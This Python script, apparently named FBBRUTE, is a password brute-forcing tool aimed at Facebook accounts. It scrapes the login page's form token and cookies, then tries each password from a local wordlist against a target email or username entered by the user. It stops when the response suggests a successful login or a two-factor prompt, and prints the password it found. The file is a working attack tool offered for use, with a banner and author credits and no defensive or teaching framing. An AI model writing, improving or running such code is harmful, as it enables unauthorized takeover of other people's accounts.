# Author : BLU3N1N3S
# Tool : FBBRUTE
# Note : add credits for me if you modified the tool

import os
import os.path
import requests
from bs4 import BeautifulSoup
import sys
import colorama
from colorama import Fore,Back,Style

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3
    fb.py\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\npassword found is: ', password)
        return True
    return False


if __name__ == "__main__":
    os.system("clear")
    print(Fore.LIGHTCYAN_EX +"""

                  _____ _____  _____  _    _                       
                 / ____|  __ \|  __ \| |  | |                      
                | |    | |__) | |__) | |__| |                      
                |      |  ___/|  ___/|  __  |                      
                | |____| |    | |    | |  | |                      
              ___\_____|_|__  |_|___ |_|__|_|_    _ _______ ______ 
             |  ____|  _ \  |  _ \|  __ \| |  | |__   __|  ____|
             | |__  | |_) | | |_) | |__) | |  | |  | |  | |__   
             |  __| |  _ <  |  _ <|  _  /| |  | |  | |  |  __|  
             | |    | |_) | | |_) | | \ \| |__| |  | |  | |____ 
             |_|    |____/  |____/|_|  \_\ \____/   |_|  |______|                                                                               
                                                               

                    [*]   CREATED BY BLU3N1N3S   [*]

        ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
        ║                                                            ║
        ║  | • Author : BLU3N1N3S                                    ║
        ║  | • Github : https://github.com/Renzcarl                  ║
        ║  | • Tool   : CPPH FB-BRUTE                                ║
        ║                                                            ║
        ║                                                            ║
        ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝


      """)


    if not os.path.isfile(PASSWORD_FILE):
        print("\nPassword file is not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print("Password file selected: ", PASSWORD_FILE)
    email = input('Enter Email/Username to target: ').strip()
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print(Fore.LIGHTGREEN_EX +" [*] Trying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
    	
